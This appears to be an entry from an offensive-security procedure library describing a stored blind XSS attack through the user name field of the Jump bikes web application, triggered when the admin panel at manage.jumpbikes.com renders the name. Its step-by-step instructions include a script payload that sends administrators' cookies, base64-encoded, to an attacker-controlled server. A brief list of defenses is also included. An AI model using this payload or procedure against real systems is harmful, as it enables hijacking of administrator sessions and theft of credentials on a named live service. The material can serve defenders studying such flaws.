---
tags:
  - xss
  - stored-xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:30:26.774Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: b8b6e4ec-ba31-4cc2-a064-dbbda07162c6
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-User-Name-Field

## Summary

This procedure exploits a lack of input sanitization in the user name field of the Jump bikes application to store a blind XSS payload that remains dormant until rendered in the admin panel.

## Description

In the Jump bikes web application, the user name field accepts arbitrary input without proper escaping or validation. An attacker with a valid user account can inject JavaScript code, which is stored server-side. This payload is later displayed unsanitized in the admin panel (manage.jumpbikes.com), executing in the administrator's browser context. The attack is blind because the attacker does not immediately see the execution but can confirm via out-of-band channels like a data beacon. Prerequisites include an authenticated user session; no special privileges are needed beyond profile editing access.

## Requirements

1. Authenticated access to the Jump bikes user account
2. Web browser for form submission
3. Optional: Attacker-controlled server for payload callback (e.g., to log execution)

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and output encoding (e.g., HTML entity encoding) for all user-controlled fields
- Use Content Security Policy (CSP) to restrict script execution
- Monitor admin panel access logs for anomalies and enable XSS payload scanning in user inputs

## Objectives

1. Store malicious JavaScript in the user name field
2. Ensure payload survives storage and retrieval
3. Prepare for execution in elevated admin context

## Instructions

### Step 1: Authenticate and Navigate to Profile

**Context**: Gain access to the editable user name field.

Log in to the Jump bikes application using valid credentials. Navigate to the account settings or profile page where the user name can be edited.

### Step 2: Craft and Inject Payload

**Context**: Insert the XSS payload into the user name field to test for storage without sanitization.

Enter a JavaScript payload in the user name field, such as:

```html
<script>fetch('https://attacker-controlled-server.com/log?admin='+btoa(document.cookie));</script>
```

Submit the form to update the profile. This stores the payload server-side.

> The payload uses `fetch` to exfiltrate admin cookies upon execution. For testing, use a simple `<script>alert('XSS in Admin');</script>`.

### Step 3: Verify Storage

**Context**: Confirm the payload is stored without triggering errors.

After submission, refresh the profile page or log out/in to ensure the user name reflects the injected content (though it may not render the script visibly to the user).

**Expected Output**: Profile update success message; payload persists in the backend.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[web]]
